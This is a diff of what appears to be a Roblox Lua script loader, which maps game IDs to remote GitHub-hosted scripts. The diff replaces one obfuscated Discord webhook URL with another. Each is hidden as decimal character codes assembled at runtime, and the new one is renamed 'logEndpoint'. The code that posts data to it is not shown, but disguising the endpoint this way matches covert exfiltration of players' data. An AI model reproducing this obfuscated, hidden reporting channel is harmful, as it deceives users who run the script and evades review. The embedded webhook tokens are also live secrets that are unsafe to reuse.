@@ -51,15 +51,25 @@ local scriptMap = {
     [117946920443617] = "https://raw.githubusercontent.com/SemionInThesius/Cooking-Recipe/refs/heads/main/Cooking%20waste.lua"
 }
 
--- 🕵️‍♂️
-local a1 = {104,116,116,112,115,58,47,47}
-local a2 = {100,105,115,99,111,114,100,46,99,111,109}
-local a3 = {47,97,112,105,47,119,101,98,104,111,111,107,115,47}
-local a4 = {49,51,55,49,50,52,53,52,51,50,50,52,55,54,56,49,49,50,56}
-local a5 = {47,80,51,87,108,71,101,54,49,81,107,97,73,84,110,74,105,105}
-local a6 = {86,108,48,65,76,76,118,82,97,66,82,70,51,83,48,48,98,45}
-local a7 = {82,80,83,120,49,118,89,121,72,51,75,118,87,107,90,118,116,83,122,112,55,101,83,52,114,65,72,54,69,116,118,79,122}
-local webhookURL = string.char(unpack(a1))..string.char(unpack(a2))..string.char(unpack(a3))..string.char(unpack(a4))..string.char(unpack(a5))..string.char(unpack(a6))..string.char(unpack(a7))
+
+local a1 = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47}
+local a2 = {97,112,105,47,119,101,98,104,111,111,107,115,47,49,51,55,51,51,52,49}
+local a3 = {51,50,52,56,55,52,54,49,54,56,57,50,47,122,52,85,115,79,97,68}
+local a4 = {118,111,90,79,68,112,108,106,122,121,120,72,48,45,103,97,66,118,67,89}
+local a5 = {101,52,117,69,82,51,76,55,115,76,76,106,78,103,105,57,82,75,50,89}
+local a6 = {98,90,101,72,85,106,56,81,67,78,117,68,109,105,105,105,70,117,109,77}
+local a7 = {119}
+
+
+local logEndpoint = string.char(unpack(a1)) ..
+                    string.char(unpack(a2)) ..
+                    string.char(unpack(a3)) ..
+                    string.char(unpack(a4)) ..
+                    string.char(unpack(a5)) ..
+                    string.char(unpack(a6)) ..
+                    string.char(unpack(a7))
+
+
 
 -- 🌫️ Blur efekti
 local blur = Instance.new("BlurEffect")
